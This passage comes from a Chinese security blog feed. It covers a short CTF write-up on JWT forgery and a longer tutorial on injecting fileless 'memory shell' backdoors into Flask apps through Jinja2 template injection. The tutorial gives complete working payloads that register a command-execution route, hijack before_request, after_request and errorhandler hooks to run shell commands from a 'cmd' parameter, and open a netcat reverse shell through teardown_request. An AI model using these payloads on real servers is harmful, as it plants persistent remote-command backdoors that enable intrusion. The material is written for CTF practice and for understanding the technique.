class="line">    <span class="keyword">return</span> base64.b64encode(x.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode().replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">header = <span class="string">&#x27;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;None&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;user&quot;:&quot;admin&quot;&#125; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(jwtBase64Encode(header) + <span class="string">&#x27;.&#x27;</span> + jwtBase64Encode(payload) + <span class="string">&#x27;.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后就是找密钥：1，使用工具爆破 2，看看有没有目录泄露。爆破没出来，有个&#x2F;robots.txt然后把密钥搞到，伪造就好了</p><p><img src="/images/achieve/2025/10/6.png"></p><p>然后伪造之后有个flag的图片，抓包抓不了，又没回显，curl外带呗</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://6919af93-4974-40e5-9bf9-e1cc56c29838.node5.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png</span><br></pre></td></tr></table></figure><h2 id="RootersCTF2019-notifyxapi"><a href="#RootersCTF2019-notifyxapi" class="headerlink" title="[RootersCTF2019]notifyxapi"></a>[RootersCTF2019]notifyxapi</h2><p>注册的时候伪造admin就出来了，不难！</p><p>总的来说这个比赛可以说是非常简单！</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> curl </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask下的内存马</title>
      <link href="/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="什么是内存马"><a href="#什么是内存马" class="headerlink" title="什么是内存马"></a>什么是内存马</h3><p>内存马是一种<strong>无文件落地</strong>的恶意代码。不同于传统的webshell：通常是一个文件。攻击者利用某些中间件的进程执行内存马，从而进行getshell！</p><h3 id="flask的内存马又怎么说"><a href="#flask的内存马又怎么说" class="headerlink" title="flask的内存马又怎么说"></a>flask的内存马又怎么说</h3><p>就是利用flask的ssti漏洞，进行插入内存马！与其说是flask的ssti，不如说是jinja2的，模板引擎是jinja2！</p><h2 id="旧马（flask2-x）"><a href="#旧马（flask2-x）" class="headerlink" title="旧马（flask2.x）"></a>旧马（flask2.x）</h2><h3 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>我们对pyaload进行逐一分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>先就是找eval用于python代码，当然exec也可以！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span></span><br></pre></td></tr></table></figure><p>app是Flask类的实例，简单来说就是Flask应用本身！</p><p>add_url_rule是Flask框架中的一个核心方法，用于手动添加URL路由规则！</p><p>我们通过跟进route这个装饰器函数，找到add_url_rule在跟进它，拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_url_rule</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        rule: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        endpoint: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        view_func: ft.RouteCallable | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        provide_automatic_options: <span class="built_in">bool</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        **options: t.<span class="type">Any</span>,</span></span><br><span class="line"><span class="params">    </span>)</span><br></pre></td></tr></table></figure><p>主要就是看三个参数</p><ul><li>rule：函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头</li><li>endpoint：路由的端点名称，是一个标识符，用于在 Flask 内部引用这个路由。说白了就是一个函数名</li><li>view_func：处理这个路由请求的视图函数，当客户端访问这个路径时，会调用这个函数。</li></ul><p>接下来就看调用的这个函数了</p><p>lambda是一个无名函数，:后面是一个表达式用于实现函数的功能！这里就是导入命令函数，那么<code>_request_ctx_stack.top</code>这个又是什么玩意？</p><h4 id="flask请求上下文机制"><a href="#flask请求上下文机制" class="headerlink" title="flask请求上下文机制"></a>flask请求上下文机制</h4><blockquote><p>当网页请求进入<code>Flask</code>时, 会实例化一个<code>Request Context</code>. 在<code>Python</code>中分出了两种上下文: 请求上下文(request context)、应用上下文(session context). 一个请求上下文中封装了请求的信息, 而上下文的结构是运用了一个<code>Stack</code>的栈结构, 也就是说它拥有一个栈所拥有的全部特性. <code>request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</p></blockquote><p>那么说白了就是请求的储存的结构式栈结构，后进先出，然后通过<code>_request_ctx_stack.top</code>获取栈顶元素也就是最新请求！</p><p>那么这里我们就明白了</p><p><code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)</code>就是获得请求的cmd参数，默认值是whoami</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>eval的第二个参数是个字典用于声明里面的全局变量，用来指定<code>exec()</code> 或 <code>eval()</code> 的<strong>第一个参数（即要执行的代码字符串）中引用的、但并未在代码字符串内部定义</strong>的那些变量</p><p>到这整个pyload就分析完了</p><h3 id="本地test"><a href="#本地test" class="headerlink" title="本地test"></a>本地test</h3><p>首先安装</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install flask==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line">pip install werkzeug==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>接下来就是运行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    template=<span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    &lt;p&gt;Hello %s &lt;/p&gt;&#x27;&#x27;&#x27;</span>%(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)      <span class="comment"># 渲染为html内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:          <span class="comment"># 如果作为脚本运行，而不是被当成模块导入</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>打入内存马，进行命令执行</p><p><img src="/images/achieve/2025/10/4.png"></p><p>成功非常nice！</p><h2 id="新马（flask3-x）"><a href="#新马（flask3-x）" class="headerlink" title="新马（flask3.x）"></a>新马（flask3.x）</h2><p>为啥新版本的不行？主要是报错</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">AssertionError: <span class="title">The</span> <span class="title">setup</span> <span class="title">method</span> &#x27;<span class="title">add_url_rule</span>&#x27; <span class="title">can</span> <span class="title">no</span> <span class="title">longer</span> <span class="title">be</span> <span class="title">called</span> <span class="title">on</span> <span class="title">the</span> <span class="title">application</span>. <span class="title">It</span> <span class="title">has</span> <span class="title">already</span> <span class="title">handled</span> <span class="title">its</span> <span class="title">first</span> <span class="title">request</span>, <span class="title">any</span> <span class="title">changes</span> <span class="title">will</span> <span class="title">not</span> <span class="title">be</span> <span class="title">applied</span> <span class="title">consistently</span>.</span></span><br></pre></td></tr></table></figure><p>在应用启动之后说是不能用add_url_rule进行添加路由！</p><h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><p>什么是装饰器？</p><p>装饰器是一种用于<strong>修改或增强函数或方法行为</strong>的高级函数。装饰器本质上是一个接受函数作为参数并返回一个新函数的函数。</p><h4 id="利用before-request"><a href="#利用before-request" class="headerlink" title="利用before_request"></a>利用before_request</h4><p>before_request 方法允许我们在每个请求之前执行一些操作,跟进它</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f: T_before_request</span>) -&gt; T_before_request:</span><br><span class="line">    <span class="variable language_">self</span>.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p><code>self.before_request_funcs</code> 是 Flask 应用对象中的一个属性。它是一个 <strong>字典</strong>，用于存储在请求处理之前需要执行的钩子函数。</p><p><code>setdefault(None,[]).append(f)</code>这个其实就是用来增加新的钩子函数的！那么我们插入lambda:<strong>import</strong>(‘os’).popen(_request_ctx_stack.top.request.args.get(‘cmd’, ‘whoami’)).read()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;</span>,&#123;<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>如果不定义字典也可以去sys.modules里面去找</p><blockquote><p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然找app这个对象的方法不绝对，随机应变即可</p><p>这个payload的缺点就是只能用一次，毕竟你打入之后每次请求之前就会执行我们插入的lambda函数！</p><h4 id="利用after-request"><a href="#利用after-request" class="headerlink" title="利用after_request"></a>利用after_request</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">self, f</span>):</span><br><span class="line">    <span class="variable language_">self</span>.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p>先自己整一整</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;app.after<span class="built_in">_</span>request<span class="built_in">_</span>funcs.setdefault(None, []).append(lambda:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;,&#123;&#x27;app&#x27;:url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;current<span class="built_in">_</span>app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>为什么不行（在before_request的基础上改），打入进去之后每次请求之后就会就是执行我们的函数，但是这不是响应啊哥们</p><p>来分析正确的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    app.after_request_funcs.setdefault(None, []).append(</span></span><br><span class="line"><span class="string">        lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(</span></span><br><span class="line"><span class="string">            \&quot;\&quot;\&quot;</span></span><br><span class="line"><span class="string">            global CmdResp;</span></span><br><span class="line"><span class="string">            CmdResp = __import__(&#x27;flask&#x27;).make_response(</span></span><br><span class="line"><span class="string">                __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">            \&quot;\&quot;\&quot;</span></span><br><span class="line"><span class="string">        ) == None else resp</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>resp</code> 代表 Response Object (响应对象)就是原来的响应！<code>__import__(&#39;flask&#39;).make_response()</code>这里就可看到是需要调用make_response()这个函数来生成新的响应内容的</p><p><img src="/images/achieve/2025/10/5.png"></p><p>这个就爽多了！</p><h3 id="hook函数"><a href="#hook函数" class="headerlink" title="hook函数"></a>hook函数</h3><p>这个上面就用到了，插入的就是我们定义的钩子函数</p><blockquote><p>本质是：允许用户在某个特定时机插入自定义逻辑的一种机制，通俗点讲就是，钩子函数就像是在一个流程中预留出来的挂钩点，你可以挂上自己的函数来改变或增强原有的行为<br>这个是不是和前面的装饰器（增强函数行为）有点像，其实装饰器是就是通过钩子函数来增强函数的行为的</p></blockquote><p>特点：</p><ul><li>预定义的调用时机：不是你直接调用钩子函数，而是某个系统、框架或库在合适的时候自动调用它。</li><li>用户自定义逻辑：你写的函数会被当作 “钩子” 插入原流程中执行。</li><li>可插拔、灵活扩展：不需要改动原代码，就可以通过钩子增强功能</li></ul><h4 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a>teardown_request</h4><blockquote><p>teardown_request 是在每个请求的最后阶段执行的，即在视图函数处理完成并生成响应后，或者在请求中发生未处理的异常时，都会执行这个钩子。</p><p>它执行的时机是在响应已经确定之后，但在最终发送给客户端之前。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">teardown_request</span>(<span class="params">self, f</span>):</span><br><span class="line">        <span class="variable language_">self</span>.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">        <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p>由于是无回显所以反弹shell和写入文件都可以</p><p>反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;mkfifo /tmp/fifo; /bin/sh -i &lt; /tmp/fifo | nc ip port &gt; /tmp/fifo; rm /tmp/fifo&#x27;))&quot;</span>)</span><br></pre></td></tr></table></figure><p>写入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls &gt; 11.txt&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h4><p>此函数可以用于自定义 404 页面的回显，用于处理应用程序中发生的错误，当你 flask 遇到错误，你可以定义自定义的错误处理程序来处理错误并返回适当的响应</p><p>跟进拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">errorhandler</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span></span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Callable</span>[[T_error_handler], T_error_handler]:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">f: T_error_handler</span>) -&gt; T_error_handler:</span><br><span class="line">        <span class="variable language_">self</span>.register_error_handler(code_or_exception, f)      <span class="comment">#这个是去注册f</span></span><br><span class="line">        <span class="keyword">return</span> f         <span class="comment">#返回的是错误处理函数</span></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"><span class="comment"># T_error_handler   错误处理函数的类型</span></span><br></pre></td></tr></table></figure><p>继续跟进看看是怎么注册的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register_error_handler</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">        f: ft.ErrorHandlerCallable,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        exc_class, code = <span class="variable language_">self</span>._get_exc_class_and_code(code_or_exception)</span><br><span class="line">        <span class="variable language_">self</span>.error_handler_spec[<span class="literal">None</span>][code][exc_class] = f</span><br></pre></td></tr></table></figure><p>这里注册就是error_handler_spec，它的结构：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">self.error<span class="built_in">_</span>handler<span class="built_in">_</span>spec = &#123;</span><br><span class="line">    None: &#123;</span><br><span class="line">        404: &#123;</span><br><span class="line">            HTTPException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>404,</span><br><span class="line">            AnotherException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>another,</span><br><span class="line">        &#125;,</span><br><span class="line">        500: &#123;</span><br><span class="line">            HTTPException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>500,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说通过code和exc_class去注册这个f（错误处理函数），</p><p>但是这两家伙由_get_exc_class_and_code(code_or_exception)这个控制</p><blockquote><p>这个定义的函数 _get_exc_class_and_code 是用来处理异常类或 HTTP 状态码的。函数接受一个参数，exc_class_or_code，可以是一个异常类或者一个 HTTP 状态码（整型）。</p></blockquote><p>那么接下来直接控制f不就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__.<span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read()&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__.<span class="built_in">exec</span>(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">global exc_class</span></span><br><span class="line"><span class="string">global code</span></span><br><span class="line"><span class="string">exc_class, code = app._get_exc_class_and_code(404)</span></span><br><span class="line"><span class="string">app.error_handler_spec[None][code][exc_class] =</span></span><br><span class="line"><span class="string">lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>因为是在exec里面必须指定exec的由来，不像之前ssti里面打的</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(request.values.x).read()&#125;&#125;<span class="built_in">&amp;</span>x=cat /f*</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>也算是学了一下原理，主要就是老马：加路由！新马：主要就是打入钩子函数，在特定的时机去触发！</p><p>当然不只是flask框架下可以打内存马，不同的框架有不同的打法，但原理估摸着都类似吧！</p><p>比如：<a href="https://www.caterpie771.cn/archives/333#%E7%BB%8F%E5%85%B8%E8%B7%AF%E7%BA%BF%EF%BC%9A%E6%89%93%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0">FastAPI 内存马的研究 - caterpie的小站</a></p>]]></content>
      
      
      <categories>
          
          <category> flask内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSCTF2020（部分解）</title>
      <link href="/2025/10/27/WUSCTF2020%EF%BC%88%E9%83%A8%E5%88%86%E8%A7%A3%EF%BC%89/"/>
      <url>/2025/10/27/WUSCTF2020%EF%BC%88%E9%83%A8%E5%88%86%E8%A7%A3%EF%BC%89/</url>
      
